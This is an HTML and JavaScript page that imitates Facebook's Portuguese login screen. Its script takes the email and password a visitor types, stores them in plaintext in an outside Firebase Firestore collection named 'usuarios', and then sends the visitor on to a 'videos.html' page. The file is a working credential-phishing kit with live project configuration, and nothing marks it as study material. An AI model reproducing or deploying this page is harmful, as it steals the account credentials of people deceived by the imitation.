    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
        </div>

        <div class="right">
            <div class="login-box">
                <form id="login-form">
                    <input type="text" id="email" placeholder="Email ou telefone" class="input-field" required>
                    <input type="password" id="password" placeholder="Senha" class="input-field" required>
                    <button type="submit" class="login-button">Entrar</button>
                    <a href="#" class="forgot-password">Esqueceu a senha?</a>
                    <div class="divider"></div>
                    <button type="button" class="create-account-button">Criar nova conta</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Firebase Configuration and Firestore Integration -->
    <script type="module">
        // Importar funções do Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-analytics.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";

        // Sua configuração do Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyDN99R5e_5gyrVG8SLSAVRcQBnKQZl1JSk",
            authDomain: "teste-face-f0bc1.firebaseapp.com",
            projectId: "teste-face-f0bc1",
            storageBucket: "teste-face-f0bc1.appspot.com",
            messagingSenderId: "512570531586",
            appId: "1:512570531586:web:46c5f841969d79f75d6c1b",
            measurementId: "G-7DJ3ZJR9P5"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);

        // Inicializar Firestore
        const db = getFirestore(app);

        // Adicionar listener para o evento de submit do formulário
        document.getElementById('login-form').addEventListener('submit', async function(event) {
            event.preventDefault(); // Evita o envio padrão do formulário

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                const usuariosCollection = collection(db, "usuarios");
                await addDoc(usuariosCollection, {
                    email: email,
                    password: password
                });
                console.log("Dados enviados com sucesso!");

                // Redirecionar para a página de vídeos após o envio dos dados
                window.location.href = 'videos.html'; // Certifique-se de que o caminho está correto
            } catch (error) {
                console.error("Erro ao enviar os dados: ", error);
                alert("Ocorreu um erro ao enviar os dados. Por favor, tente novamente.");
            }
        });
    
    </script>
